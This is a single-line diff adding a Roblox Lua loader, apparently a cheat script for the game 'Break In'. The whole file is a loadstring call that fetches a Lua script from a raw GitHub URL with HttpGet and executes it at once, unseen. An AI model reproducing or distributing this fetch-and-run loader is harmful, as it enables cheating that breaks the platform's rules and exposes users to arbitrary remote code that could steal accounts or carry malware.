@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/od1ri/Break-in-1/main/v1.lua"))()
